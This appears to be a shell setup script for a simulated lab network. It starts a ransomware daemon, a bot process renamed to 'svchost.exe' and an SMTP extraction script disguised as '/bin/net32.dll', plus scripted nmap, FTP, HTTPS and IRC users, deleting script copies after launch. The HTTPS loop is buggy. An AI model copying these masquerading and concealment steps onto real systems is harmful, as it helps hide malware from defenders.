# set up networking
echo "nameserver 192.168.1.1" > /etc/resolv.conf
sudo route add default gw 192.168.1.1

# start botping process
cp bot_ping.py /usr/bin/
mv /usr/bin/bot_ping.py /usr/bin/svchost.exe
python2 svchost.exe &

# start ransomware daemon
python2 system32.py &

# add users
bash add_users.bash

# start ssh
systemctl start ssh

# start nmap user
su fred_1 -c 'nmap -r -F --max-rate 1 10.10.1.0/24' > /dev/null &

# start ftp user
cp ftp_user.py /home/allan_1/allan_1.py
python2 /home/allan_1/allan_1.py &
rm /home/allan_1/allan_1.py

# start https users
declare -a httpsusers=("jacob_1" "jacob_2" "sara_1" "brett_1")
for httpsuser in "${httpsusers[@]}"
do
	cp https_user.py /home/"$httpsuser"/"$httpsuser".py
	su jacob_1 -c 'python2 /home/$httpsuser/$httspuser.py' > /dev/null &
	rm /home/"$httpsuser"/"$httpsuser".py
done

# start irc user
cp irc_client.py /home/Adminestrator/Adminestrator.py
python2 /home/Adminestrator/Adminestrator.py &
rm /home/Adminestrator/Adminestrator.py

# http post

# smtp
cp smtp_extract.py /bin/net32.dll
python2 /bin/net32.dll &

